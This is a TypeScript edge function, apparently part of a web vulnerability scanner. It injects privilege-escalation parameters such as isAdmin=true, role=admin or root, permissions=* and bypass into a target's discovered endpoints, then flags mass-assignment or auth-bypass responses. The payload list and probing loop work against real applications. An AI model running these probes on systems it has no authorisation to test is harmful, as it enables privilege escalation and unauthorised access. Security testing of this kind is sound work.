// Symbolic Param Explorer — extracts every param across the app, transplants
// "admin-flavored" params onto endpoints (mass-assignment, hidden flags).
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
import { safeFetch, readBodySafe } from "../_shared/safe-fetch.ts";

const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type" };
const db = () => createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);

// High-value params worth transplanting onto every endpoint
const POWER_PARAMS: Record<string, any[]> = {
  isAdmin: [true, 1, "true"],
  is_admin: [true, 1],
  admin: [true, 1, "yes"],
  role: ["admin", "superuser", "root", "owner"],
  roles: [["admin"], "admin"],
  permissions: [["*"], "all"],
  scope: ["admin", "*", "openid admin"],
  debug: [true, 1, "true"],
  test: [true, 1],
  internal: [true],
  bypass: [true, 1],
  verified: [true, 1],
  approved: [true, 1],
  active: [true],
  banned: [false],
  premium: [true],
  trial: [false],
};

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: cors });
  try {
    const { targetId } = await req.json();
    const supa = db();
    const { data: eps } = await supa.from("discovered_endpoints").select("id,url,method,parameters").eq("target_id", targetId).limit(30);
    const findings: any[] = [];
    let probes = 0;

    for (const ep of (eps || [])) {
      const isJsonish = ["POST", "PUT", "PATCH"].includes(ep.method?.toUpperCase() || "");
      const baseParams = (ep.parameters || {}) as Record<string, any>;
      // baseline
      let baseLen = 0, baseStatus = 0;
      try {
        const r0 = isJsonish
          ? await safeFetch(ep.url, { method: ep.method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(baseParams) }, 6000)
          : await safeFetch(ep.url, { method: ep.method }, 6000);
        const t0 = await readBodySafe(r0, 4000);
        baseLen = t0.length; baseStatus = r0.status; probes++;
      } catch { continue; }

      for (const [pname, vals] of Object.entries(POWER_PARAMS)) {
        for (const v of vals) {
          if (probes > 150) break;
          const mutated = { ...baseParams, [pname]: v };
          try {
            let r: Response;
            if (isJsonish) {
              r = await safeFetch(ep.url, { method: ep.method, headers: { "Content-Type": "application/json" }, body: JSON.stringify(mutated) }, 6000);
            } else {
              const u = new URL(ep.url);
              u.searchParams.set(pname, String(v));
              r = await safeFetch(u.toString(), { method: ep.method }, 6000);
            }
            const t = await readBodySafe(r, 4000);
            probes++;
            const lenDelta = Math.abs(t.length - baseLen);
            // Mass-assignment signal: param echoed back, OR response shape changed materially, OR escalated from 401/403 → 200
            const promoted = (baseStatus >= 400 && r.status >= 200 && r.status < 300);
            const echoed = typeof v !== "object" && t.includes(String(v)) && t.includes(pname);
            const shifted = r.status === baseStatus && lenDelta > Math.max(200, baseLen * 0.3);
            if (promoted || echoed || shifted) {
              findings.push({
                target_id: targetId,
                title: `Mass-assignment: ${pname}=${JSON.stringify(v)} on ${new URL(ep.url).pathname}`,
                severity: promoted ? "critical" : "high",
                description: `Transplanted power-param "${pname}=${JSON.stringify(v)}" caused ${promoted ? "auth bypass (status " + baseStatus + "→" + r.status + ")" : echoed ? "param echoed/accepted" : "response shape shift"}. Likely mass-assignment / hidden privilege flag.`,
                affected_url: ep.url, payload: `${pname}=${JSON.stringify(v)}`,
                vuln_class: "mass_assignment",
                confidence_score: promoted ? 0.9 : echoed ? 0.7 : 0.55,
                source: "symbolic-param-explorer",
                proof_tier: promoted ? "exploited" : "suspected",
                evidence: { baseStatus, newStatus: r.status, lenDelta, echoed },
              });
              break; // one finding per param is enough
            }
          } catch {}
        }
        if (probes > 150) break;
      }
      if (probes > 200) break;
    }

    if (findings.length) await supa.from("vulnerability_findings").insert(findings);
    await supa.from("scan_logs").insert({
      target_id: targetId, log_type: findings.length ? "warning" : "info",
      message: `🧩 Symbolic Param Explorer: ${probes} probes, ${findings.length} hidden-flag/mass-assign findings`,
      metadata: { probes, count: findings.length },
    });

    return new Response(JSON.stringify({ probes, findings: findings.length }), { headers: { ...cors, "Content-Type": "application/json" } });
  } catch (e) {
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : String(e) }), { status: 200, headers: { ...cors, "Content-Type": "application/json" } });
  }
});
